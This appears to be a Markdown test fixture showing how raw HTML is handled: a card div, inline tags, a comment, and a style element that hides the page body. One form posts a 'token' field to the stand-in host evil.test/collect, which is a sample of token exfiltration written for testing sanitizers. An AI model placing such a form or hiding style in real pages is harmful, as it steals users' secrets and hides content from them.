# Raw HTML

A block of raw HTML:

<div class="card">
  <h2>A heading inside raw HTML</h2>
  <p>A paragraph inside raw HTML.</p>
</div>

Inline <b>bold</b> and <i>italic</i> HTML in a sentence.

A form that would collect something:

<form action="https://evil.test/collect" method="post">
  <input name="token" type="text">
  <button type="submit">Send</button>
</form>

An HTML comment: <!-- nothing to see -->

A style element: <style>body { display: none }</style>
